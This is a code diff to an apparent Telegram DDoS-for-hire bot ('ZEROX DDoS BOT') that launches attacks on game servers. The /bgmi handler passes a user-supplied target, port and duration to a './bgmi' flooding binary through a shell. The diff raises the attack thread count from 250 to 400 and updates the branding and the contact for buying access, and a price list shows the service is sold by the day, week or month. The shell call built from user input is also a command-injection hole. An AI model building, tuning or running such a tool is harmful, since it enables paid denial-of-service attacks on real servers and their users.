@@ -241,7 +241,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 250"
+                full_command = f"./bgmi {target} {port} {time} 400"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -302,7 +302,7 @@ def welcome_start(message):
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
 Must Read /rules Before Use
-𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 ZEROX 『』 𝐃𝐃𝐨𝐒 𝐁𝐎𝐓 ⚡'''
+𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝗭𝗘𝗥𝗢𝗫 𝐃𝐃𝐨𝐒 𝐁𝐎𝐓 ⚡'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -330,7 +330,7 @@ Day-->100 Rs
 Week-->400 Rs
 Month-->1200 Rs
 
-Contact @dm To Buy Access
+Contact @𝗭𝗘𝗥𝗢𝗫  To Buy Access
 '''
     bot.reply_to(message, response)
 
